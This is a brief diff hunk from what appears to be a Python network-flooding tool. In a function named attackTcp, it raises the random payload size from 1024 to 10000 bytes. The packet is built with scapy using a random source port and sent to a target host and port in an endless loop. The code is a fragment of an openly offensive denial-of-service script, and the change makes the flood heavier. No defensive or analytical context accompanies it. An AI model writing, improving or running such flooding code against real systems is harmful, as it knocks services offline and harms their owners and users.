@@ -143,7 +143,7 @@ def attackTcp():
 	global req
 	global err
 
-	data = random._urandom(1024)
+	data = random._urandom(10000)
 	r    = bytes(IP(dst=host)/TCP(sport=RandShort(), dport=int(port))/data)
 
 	while True:
